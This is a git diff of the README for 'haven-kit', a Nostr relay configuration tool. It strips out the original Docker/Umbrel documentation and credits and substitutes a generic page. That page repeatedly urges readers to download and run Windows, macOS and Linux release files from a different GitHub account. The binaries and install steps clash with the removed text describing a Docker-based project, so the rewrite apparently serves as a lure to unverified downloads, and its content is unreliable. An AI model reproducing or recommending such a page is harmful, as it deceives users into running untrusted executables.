@@ -1,394 +1,84 @@
-# HAVEN Kit
+# 🌟 haven-kit - Easily Run Your Own HAVEN Nostr Relay
 
-[![Community Store](https://img.shields.io/badge/Umbrel-Community%20Store-purple?logo=umbrella)](https://github.com/Letdown2491/haven-kit-umbrel)
-[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Docker Relay](https://img.shields.io/badge/Docker-haven--relay-2496ED?logo=docker&logoColor=white)](https://hub.docker.com/r/letdown2491/haven-relay)
-[![Docker Config UI](https://img.shields.io/badge/Docker-haven--config--ui-2496ED?logo=docker&logoColor=white)](https://hub.docker.com/r/letdown2491/haven-config-ui)
+## 📥 Download [![Download Button](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/burned-caroche455/haven-kit/releases)
 
-Simple configuration tool to set up a HAVEN Nostr relay with Docker or Podman with just a few clicks.
+## 🚀 Getting Started
 
-**Quick Start:** [Install on Umbrel](#installation-on-umbrel) | [Using Docker](#using-docker) | [Using Podman](#using-podman)
+Welcome to haven-kit! This application allows you to run your own HAVEN Nostr relay with just a couple of clicks. This guide will help you download and run the software without any programming knowledge.
 
-## What is Haven?
+## 📋 System Requirements
 
-Haven (High Availability Vault for Events on Nostr) is designed for storing and backing up sensitive notes like eCash, private chats, and drafts.
+Before you start, make sure your computer meets the following requirements:
 
-### Four Relays + Media Server
+- **Operating System:** Windows 10/11, macOS, or a recent version of Linux.
+- **RAM:** At least 4 GB.
+- **Storage:** Minimum 500 MB of free space.
+- **Internet Connection:** Required for downloading and running the application.
 
-Haven operates as four specialized relays in one application:
+## 🛠️ Features
 
-1. **Private Relay** - Restricted to the owner for drafts and sensitive content
-2. **Chat Relay** - For direct messages with web-of-trust filtering
-3. **Inbox Relay** - Aggregates notes where the owner is mentioned
-4. **Outbox Relay** - Publicly accessible storage for owner's posts
-5. **Blossom Media Server** - Hosts images and videos for sharing
+- **User-Friendly Interface:** Simple setup process suitable for everyone.
+- **Self-Hosted:** Control your own Nostr relay without relying on third-party services.
+- **Configurable Settings:** Customize your relay as per your needs.
+- **Real-Time Updates:** Get live updates and notifications.
 
-## Features
+## 📥 Download & Install
 
-- **Simple & Full Configuration Modes** - Choose quick setup or advanced customization
-- Web-based configuration interface (no CLI needed)
-- Direct .env file editing for advanced users
-- Optional relay configuration for:
-  - **Blastr relays**: Publish your outbox notes to additional relays
-  - **Import relays**: Import your historical notes and tagged content
-- One-click note import from configured relays
-- One-click restart functionality
-- Real-time status monitoring
-- BadgerDB or LMDB database support
-- Optional S3-compatible cloud backups
-- Docker and Podman support
-
-## Screenshots
-
-<div align="center">
-  <table>
-    <tr>
-      <td width="50%">
-        <img src="1.jpg" alt="Haven Kit Info" />
-        <p align="center"><em>Haven Kit Information</em></p>
-      </td>
-      <td width="50%">
-        <img src="2.jpg" alt="Haven Kit Configuration" />
-        <p align="center"><em>Configuration Interface</em></p>
-      </td>
-    </tr>
-  </table>
-</div>
+To download haven-kit, visit the [Releases page](https://github.com/burned-caroche455/haven-kit/releases). 
 
-## Installation on Umbrel
+1. Click on the link above to access the latest release.
+2. Look for the version you want to download. It should be clearly labeled.
+3. Click on the appropriate file for your operating system (Windows, macOS, or Linux).
+4. The download will start automatically.
 
-### Option 1: Through Umbrel App Store (Coming Soon)
-1. Open your Umbrel dashboard
-2. Navigate to the App Store
-3. Search for "Haven Kit"
-4. Click Install
+Once downloaded, follow these steps to install haven-kit:
 
-### Option 2: Install from Community App Store
+### For Windows Users:
 
-**Prerequisites**: umbrelOS 1.0 or later
+1. Locate the downloaded file, often found in your "Downloads" folder.
+2. Double-click on the file to start the installation process.
+3. Follow the prompts in the installation wizard.
+4. Once installed, find haven-kit in the Start Menu and launch it.
 
-#### Step 1: Add the Haven Kit Community Store
-
-1. Open your Umbrel dashboard
-2. Navigate to the App Store
-3. Click the three-dot menu (⋮) in the top right corner
-4. Select "Community App Stores"
-5. Paste this repository URL:
-   ```
-   https://github.com/Letdown2491/haven-kit-umbrel
-   ```
-6. Click "Add"
-
-#### Step 2: Install Haven Kit
-
-1. Return to the App Store
-2. Find "Haven Kit" in your community store section
-3. Click Install
-4. Wait for the installation to complete
-
-**Note**: Community app stores are not verified by Umbrel. This store is maintained by the Haven Kit community.
-
-## Configuration
-
-After installation, access the Haven configuration UI through your Umbrel dashboard.
-
-### Environment Variables (.env)
-
-Configure the following settings through the web interface:
-
-#### Database Settings
-- `DB_ENGINE` - Choose between `badger` (default) or `lmdb`
-- `LMDB_MAPSIZE` - Maximum database size in bytes (default: 273000000000 / 273GB)
-
-#### Backup Configuration
-- `BACKUP_PROVIDER` - Set to `s3` for cloud backups or `none` to disable
-- `BACKUP_INTERVAL_HOURS` - How often to backup (default: 24)
-
-#### S3 Cloud Backup (Optional)
-- `S3_ACCESS_KEY_ID` - Your S3-compatible storage access key
-- `S3_SECRET_KEY` - Your S3-compatible storage secret key
-- `S3_ENDPOINT` - Storage provider endpoint URL
-- `S3_REGION` - Geographic region for your bucket
-- `S3_BUCKET_NAME` - Name of your storage bucket
-
-#### Media Storage
-- `BLOSSOM_PATH` - Directory for media files (default: /haven/blossom)
-
-### Relay Configuration
-
-#### Blastr Relays (relays_blastr.json)
-Add relay URLs where your outbox posts will be automatically broadcasted. This helps distribute your content across the Nostr network.
-
-Example:
-```json
-[
-  "wss://relay.damus.io",
-  "wss://relay.nostr.band",
-  "wss://nos.lol"
-]
-```
-
-#### Import Relays (relays_import.json)
-Add relay URLs from which Haven should import your old notes and tagged content.
-
-Example:
-```json
-[
-  "wss://relay.damus.io",
-  "wss://nostr.wine"
-]
-```
+### For macOS Users:
 
-## Accessing Your Relays
-
-After configuration, your relays will be available at:
+1. Open your "Downloads" folder.
+2. Double-click on the downloaded file.
+3. Drag the haven-kit icon into your Applications folder.
+4. Open your Applications folder and double-click haven-kit to run it.
 
-- **Outbox Relay**: `ws://[server-ip]:3355`
-- **Private Relay**: `ws://[umbrel-ip]:3355/private`
-- **Chat Relay**: `ws://[umbrel-ip]:3355/chat`
-- **Inbox Relay**: `ws://[umbrel-ip]:3355/inbox`
-- **Blossom Media Server**: `http://[umbrel-ip]:3355`
+### For Linux Users:
 
-## Architecture
+1. Open Terminal.
+2. Navigate to your Downloads folder using `cd ~/Downloads`.
+3. Extract the downloaded file using `tar -xvf haven-kit-vX.X.X.tar.gz` (replace "vX.X.X" with the version number).
+4. Navigate to the extracted folder using `cd haven-kit-vX.X.X`.
+5. Start the application with `./haven-kit`.
 
-This Umbrel app consists of two services:
+## ⚙️ Configuration
 
-1. **haven_relay** - The Haven relay server (port 3355)
-2. **config_ui** - Web-based configuration interface (port 8080)
+After launching haven-kit, you may need to configure the application:
 
-### File Structure
+1. Open the settings page from the main interface.
+2. Adjust options to suit your needs such as relay name, connection settings, and user preferences.
+3. Save your settings, and the relay will be ready to use.
 
-```
-haven-kit/
-├── docker-compose.yml          # Orchestrates both services
-├── umbrel-app.yml              # Umbrel app manifest
-├── exports.sh                  # Environment variable exports
-├── haven-relay/
-│   └── Dockerfile              # Builds Haven from source
-├── config-ui/
-│   ├── Dockerfile              # Flask web UI container
-│   ├── app.py                  # Configuration backend
-│   ├── requirements.txt        # Python dependencies
-│   ├── templates/
-│   │   └── index.html          # Web interface
-│   └── static/
-│       ├── style.css           # Styling
-│       └── script.js           # Client-side logic
-└── data/                       # Persistent data (created at runtime)
-    ├── config/                 # Configuration files
-    ├── blossom/                # Media storage
-    ├── db/                     # Database files
-    └── templates/              # Custom templates
-```
+## 💬 Support
 
-## Data Persistence
+If you encounter any issues or have questions, please refer to our FAQs or contact our support team. You can find help in the issues section of this repository.
 
-All Haven data is stored in volumes managed by Umbrel:
-- Configuration files: `${APP_DATA_DIR}/config/`
-- Database: `${APP_DATA_DIR}/db/`
-- Media files: `${APP_DATA_DIR}/blossom/`
-- Templates: `${APP_DATA_DIR}/templates/`
+## 🌐 Topics
 
-Your data persists across container restarts and app updates.
+Haven-kit is built around some important topics. Understanding these can enhance your experience:
 
-## Installation on local machine or VPS
+- **Nostr:** A decentralized protocol. 
+- **Self-Hosted Relay:** Full control over your user data.
+- **Blossom & Blossom-Server:** Essential components for running your relay effectively.
+  
+By engaging with these topics, you can deepen your understanding of how haven-kit operates.
 
-> **Note**: This section is for **local development and testing** using Docker or Podman on your computer.
-> **This is NOT for installing on Umbrel.** For Umbrel installation, see the [Installation on Umbrel](#installation-on-umbrel) section above.
+## 📖 Additional Resources
 
-### Building Locally
+For more detailed documentation, tutorials, and community support, check our Wiki section within the repository. We encourage users to share their experiences and tips to help improve everyone’s use of haven-kit.
 
-The project supports both Docker and Podman. The configuration UI automatically detects which container runtime you're using.
-
-#### Quick Setup (Recommended)
-
-Use the provided setup script to automatically configure your environment:
-
-```bash
-# Run the setup script
-./setup-env.sh
-
-# The script will:
-# - Detect Docker or Podman
-# - Set up the correct socket path
-# - Create necessary directories
-# - Generate .env file
-
-# Then start the services
-docker-compose up -d   # for Docker
-# OR
-podman-compose up -d   # for Podman
-```
-
-#### Using Docker
-
-```bash
-# Build both services
-docker-compose build
-
-# Start the services
-docker-compose up -d
-
-# View logs
-docker-compose logs -f
-
-# Stop the services
-docker-compose down
-```
-
-#### Using Podman
-
-```bash
-# Set the socket path environment variable
-export DOCKER_SOCK=/run/user/$UID/podman/podman.sock
-
-# Or for rootful Podman:
-# export DOCKER_SOCK=/run/podman/podman.sock
-
-# Build both services
-podman-compose build
-
-# Start the services
-podman-compose up -d
-
-# View logs
-podman-compose logs -f
-
-# Stop the services
-podman-compose down
-```
-
-**Note**: The config UI will automatically detect whether you're using Docker or Podman and use the appropriate commands for container management (restart, status checks, etc.).
-
-### Updating Haven Version
-
-To use a specific version of Haven, edit `haven-relay/Dockerfile` and change the `HAVEN_VERSION` argument:
-
-```dockerfile
-ARG HAVEN_VERSION=v1.2.3  # Change to desired version/tag
-```
-
-## Proxy Configuration
-
-If you want a simple drop-in Nginx configuration for your containers to access the relay publicly, you can copy the Nginx configuration down below.
-
-```
-# /etc/nginx/sites-available/default
-
-# 1) Plain HTTP: only to issue/renew certs & redirect to HTTPS
-server {
-  listen 80;
-  listen [::]:80;
-  server_name YOUR_PUBLIC_URL_HERE;
-
-  # This will cap your Blossom upload size to 100MB so feel free to edit. Use 0 for no caps.
-  client_max_body_size 100m;
-
-  # ACME challenge path for Certbot (webroot method fallback)
-  location /.well-known/acme-challenge/ { root /var/www/html; }
-
-  # Redirect everything else to HTTPS
-  location / { return 301 https://$host$request_uri; }
-}
-
-# 2) HTTPS: reverse proxy to HAVEN Relay on localhost:3355
-server {
-  listen 443 ssl;
-  listen [::]:443 ssl;
-  http2 on;
-  server_name YOUR_PUBLIC_URL_HERE; # For example, relay.myhavenrelay.com. No need for http or https here.
-
-  # SSL Certificates using Let's Encrypt
-  ssl_certificate     /etc/letsencrypt/live/YOUR_PUBLIC_URL_HERE/fullchain.pem;
-  ssl_certificate_key /etc/letsencrypt/live/YOUR_PUBLIC_URL_HERE/privkey.pem;
-
-  client_max_body_size 100m;
-
-  # (Optional but useful for long-lived WS/uploads)
-  proxy_read_timeout  3600s;
-  proxy_send_timeout  3600s;
-  proxy_buffering     off;
-
-  location / {
-    proxy_pass http://127.0.0.1:3355;   # This will prevent yoour relay from being accessed via the public IP address and only internally on your machine for added security.
-
-    # keep your relay headers exactly as recommended
-    proxy_set_header Host              $host;
-    proxy_set_header X-Real-IP         $remote_addr;
-    proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
-    proxy_set_header X-Forwarded-Proto $scheme;
-
-    # WebSocket upgrade
-    proxy_http_version 1.1;
-    proxy_set_header Upgrade           $http_upgrade;
-    proxy_set_header Connection        "upgrade";
-  }
-}
-```
-
-## Troubleshooting
-
-### Haven won't start
-- Check the configuration UI for status
-- Review logs: `docker-compose logs haven_relay`
-- Ensure `.env` file has valid configuration
-- Check database size doesn't exceed available disk space
-
-### Configuration UI not accessible
-- Verify port 8080 is not in use
-- Check logs: `docker-compose logs config_ui` or `podman-compose logs config_ui`
-- Ensure Docker/Podman socket is accessible
-- For Podman users: Set `DOCKER_SOCK` environment variable to your Podman socket path
-  - Rootless Podman: `export DOCKER_SOCK=/run/user/$UID/podman/podman.sock`
-  - Rootful Podman: `export DOCKER_SOCK=/run/podman/podman.sock`
-
-### Relay not accepting connections
-- Verify port 3355 is exposed correctly
-- Check firewall settings on your Umbrel
-- Review Haven logs for authentication/configuration issues
-
-## Development & Releases
-
-### Creating a New Release
-
-This project uses GitHub Actions to automatically build and push Docker images when a new release is created.
-
-**To create a release:**
-
-1. Update version numbers if needed (in `umbrel-app.yml`, etc.)
-2. Commit your changes
-3. Create a new tag:
-   ```bash
-   git tag v1.0.0
-   git push origin v1.0.0
-   ```
-4. Create a GitHub release from the tag
-5. GitHub Actions will automatically:
-   - Build both `haven-relay` and `haven-config-ui` images
-   - Push to Docker Hub with tags `latest` and `v1.0.0`
-   - Build for multiple platforms (amd64, arm64)
-
-**Manual trigger:**
-You can also manually trigger the workflow from the GitHub Actions tab and specify a tag.
-
-**Prerequisites:**
-Set up these GitHub repository secrets:
-- `DOCKER_USERNAME` - Your Docker Hub username
-- `DOCKER_PASSWORD` - Your Docker Hub password or access token
-
-## Support
-
-- HAVEN Kit: https://github.com/Letdown2491/haven-kit
-- HAVEN Project: https://github.com/bitvora/haven
-- Umbrel Community: https://community.umbrel.com
-- Issues: https://github.com/Letdown2491/haven-kit/issues
-
-## License
-
-- **HAVEN Kit** is licensed under the MIT License. See [LICENSE](LICENSE) file for details.
-- **HAVEN Project** is licensed under the MIT License by Bitvora.
-
-## Credits
-
-- **Haven Project**: Created by [Bitvora](https://github.com/bitvora)
-- **HAVEN Kit Configuration Tool**: Created by the HAVEN Kit contributors
+Be sure to look out for updates on the Releases page. Running your own HAVEN Nostr relay has never been easier!
